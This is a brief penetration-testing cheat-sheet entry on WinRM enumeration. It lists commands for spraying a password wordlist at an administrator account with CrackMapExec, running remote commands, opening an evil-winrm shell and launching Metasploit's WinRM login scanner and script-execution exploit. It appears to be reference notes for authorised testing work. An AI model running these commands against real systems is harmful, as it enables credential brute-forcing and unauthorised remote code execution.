---
title: WinRM Enumeration
category: recon
subcategory: service-enum
os: linux
command: crackmapexec winrm target -u user -p pass
tools: crackmapexec, evil-winrm, msfconsole
---


### CrackMapExec / NetExec

```bash
crackmapexec winrm 10.10.2.242 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
crackmapexec winrm 10.10.2.242 -u administrator -p haslo -x "whoami"
crackmapexec winrm 10.10.2.242 -u administrator -p haslo -x "systeminfo"
```

### Evil-WinRM

```bash
evil-winrm.rb -u administrator -p 'haslo' -i 10.10.2.242
```

### Metasploit

```bash
use auxiliary/scanner/winrm/winrm_login
use exploit/windows/winrm/winrm_script_exec
set FORCE_VBS true
```
